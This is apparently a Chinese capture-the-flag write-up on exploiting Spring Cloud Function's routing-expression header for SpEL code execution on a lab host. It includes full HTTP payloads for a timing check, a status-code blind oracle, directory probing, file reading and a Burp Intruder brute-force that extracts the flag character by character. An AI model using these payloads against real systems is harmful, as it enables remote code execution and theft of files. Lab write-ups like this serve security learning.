## 攻击链总览

```
浏览器访问靶机 → BP 拦下正常请求 → 转 Repeater
→ 加恶意头 spring.cloud.function.routing-expression 注入 SpEL
→ sleep(5000) 响应变 5 秒 → RCE 实锤
→ 命令无回显、目标不出网 → 改用"状态码判断法"问是非题
→ 用 SpEL 的 File 类问出 flag 文件位置（桌面 flag 文件）
→ Intruder 批量爆破每个位置的字符（状态码 500=猜对，200=猜错）
→ 拼出 38 位 flag → equals() 整串验证闭环
```

**核心思想**：这个靶机执行了命令但不把结果显示出来。解决办法是把"猜对/猜错"变成响应的**状态码**（500=对，200=错），然后逐个字符去问。

## 漏洞验证

###  原理

Spring Cloud Function 有个功能：请求头 **`spring.cloud.function.routing-expression`** 的值会被当成 SpEL 表达式**直接执行**，没有任何过滤。SpEL 能调用 Java 任意类 → 等于远程代码执行（RCE）。

### 第一步：证明代码真的执行了

在 Repeater 里把底片改成下面这样（路径改成 `/functionRouter`，加一个头）：

```http
POST /functionRouter HTTP/1.1
Host: 10.100.116.102:8080
spring.cloud.function.routing-expression: T(java.lang.Thread).sleep(5000)
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

input=hello
```

**怎么看结果**：看 Repeater 界面显示的响应时间（Response 面板旁的 Time 显示）。

实测：正常请求约 **0.08 秒**，这个包约 **5.07 秒** —— 服务器真的睡了 5 秒 → **SpEL 表达式被执行了，RCE 实锤**。

![image-20260906102751132](/images/uploads/information-reuse-05.png)

### 第二步：搭"状态码判断器"

sleep 只能证明执行，但没法把数据"带出来"。靶机还有两个坏消息：

1. 表达式的计算结果**不会出现在响应里**（网上经典 PoC 的回显在这里无效）
2. 靶机**不能反向连接到我的电脑**（出网被防火墙挡了）

解决思路：让服务器"猜对时故意报错"。SpEL 里 `1/0` 是除零，会抛异常 → Burp 里看到 **HTTP 500**；猜错时返回字符串 `'x'`，不报错 → **HTTP 200**。

**判断器模板：**

```http
POST /functionRouter HTTP/1.1
Host: 10.100.116.102:8080
spring.cloud.function.routing-expression: (这里放判断条件) ? 1/0 : 'x'
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

input=hello
```

- **响应 500 = 条件成立（猜对）**
- **响应 200 = 条件不成立（猜错）**

先验证判断器本身没毛病

## 定位 flag 文件

### 用 File 类逐个目录问

把判断条件换成"某个目录的文件列表里有没有 flag 字样"。SpEL 读目录列表的固定写法：

```
T(java.util.Arrays).toString(new java.io.File('目录路径').list()).contains('flag')
```

> 路径注意：Windows 路径要写**正斜杠** `C:/Users/...`，别写反斜杠。

示例包（问"Administrator 桌面上有没有名字带 flag 的文件"）：

### 逐个位置试的结果汇总

| 问的位置（条件里的路径）                         | 响应    | 结论     |


## 提取 flag 内容

### 读文件内容的固定表达式

SpEL 读整个文件的写法（后面记为 **$读文件**，写包时把它抄进去）：

```
new java.util.Scanner(new java.io.File('C:/Users/Administrator/Desktop/flag')).useDelimiter('\\A').next()
```

> **注意两个细节**：
>
> 1. `useDelimiter('\\A')` 里是**两个反斜杠**（SpEL 转义后才是"读到文件尾"的意思）。在 Burp 里直接照抄本 WP 的字面量即可，两个就是两个。
> 2. 整个表达式很长，小心别抄漏括号。

先问两个基础问题确认格式（都套判断器模板）：

问"是不是 `flag{` 开头"：

```http
POST /functionRouter HTTP/1.1
Host: 10.100.116.102:8080
spring.cloud.function.routing-expression: (new java.util.Scanner(new java.io.File('C:/Users/Administrator/Desktop/flag')).useDelimiter('\\A').next().startsWith('flag{')) ? 1/0 : 'x'
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

input=hello
```

实测：**500**（是 `flag{` 开头）

问"长度是不是 38"：

```http
POST /functionRouter HTTP/1.1
Host: 10.100.116.102:8080
spring.cloud.function.routing-expression: (new java.util.Scanner(new java.io.File('C:/Users/Administrator/Desktop/flag')).useDelimiter('\\A').next().length() == 38) ? 1/0 : 'x'
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

input=hello
```

实测：**500**（长度 38，即 `flag{` + 32 位 + `}` 标准格式）

## Intruder 自动爆破得flag

**步骤 1**：Repeater 里的包右键 → **Send to Intruder**，包体如下（先在 Repeater 里把表达式改成带 `0` 和 `102` 的样子）：

```http
POST /functionRouter HTTP/1.1
Host: 10.100.204.2:8080
spring.cloud.function.routing-expression:(new java.util.Scanner(new java.io.File('C:/Users/Administrator/Desktop/flag')).useDelimiter('\\A').next().codePointAt(0) == 102) ? 1/0 : 'x'
Content-Length: 11
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Origin: http://10.100.204.2:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.100.204.2:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

input=hello
```

**步骤 2**：Intruder → Positions 标签 → 点 **Clear §** 清掉自动标记 → 手动选中两个数字加标记：

- 选中 `codePointAt(` 后面的 `0`，点 **Add §** → 变成 `codePointAt(§0§)`
- 选中 `==` 后面的 `102`，点 **Add §** → 变成 `== §102§`

**步骤 3**：Positions 页右上角 Attack type 选 **Cluster bomb**（两个位点各自配一组 payload，交叉组合）

**步骤 4**：Payloads 标签：

- **Payload set 1**（位置）：Payload type 选 **Numbers**，From `0`，To `37`，Step `1`
- **Payload set 2**（字符码）：Payload type 选 **Numbers**，From `32`，To `126`，Step `1`

![image-20260906105927862](/images/uploads/information-reuse-09.png)

**步骤 5**：点 **Start attack**。共 38 × 95 = 3610 个请求，靶机响应很快（每个不到 0.1 秒)，几分钟跑完。

**步骤 6**：结果表里点 **Status 列排序** —— 会有**恰好 38 行状态码 500**（每个位置一行，因为每个位置只有一个字符猜对）。每行的两个 payload 就是答案：

- Payload 1 = 字符位置（0~37）
- Payload 2 = 该位置字符的 ASCII 码

![image-20260906110057144](/images/uploads/information-reuse-10.png)

**步骤 7**：码点转字符。常用对照：`48~57`=数字0-9，`65~90`=大写A-Z，`97~122`=小写a-z，`123`=`{`，`125`=`}`。38 个码逐个转换太麻烦的话，把 38 个码点按位置排好粘进 CyberChef 的 **From Char Code**（逗号分隔，Data format 选 Decimal）一键转出。

![image-20260906110302966](/images/uploads/information-reuse-11.png)

得到flag

> `flag{M2JvDHXty0zcECU6smOakQigPjhx3rpw}`
